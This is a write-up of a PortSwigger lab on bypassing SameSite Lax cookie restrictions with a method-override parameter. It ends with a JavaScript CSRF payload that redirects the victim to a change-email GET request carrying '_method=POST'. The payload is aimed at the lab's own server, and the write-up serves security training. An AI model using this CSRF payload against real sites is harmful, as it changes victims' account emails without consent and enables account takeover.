
# SameSite Lax bypass via method override

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

Note: The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions




![img](images/SameSite%20Lax%20bypass%20via%20method%20override/1.png)

---------------------------------------------

Chrome sets Lax restriction by default so we must try to execute a GET request that will change the user's email. By default it is a POST request:



![img](images/SameSite%20Lax%20bypass%20via%20method%20override/2.png)


If we change the method to GET and add “\_method” parameter it still works:


![img](images/SameSite%20Lax%20bypass%20via%20method%20override/3.png)

Then we will use this payload:

```
<script>
    document.location = 'https://0a6d00f7038377ec8069495800fd0010.web-security-academy.net/my-account/change-email?email=test4%40test.com&_method=POST';
</script>
```
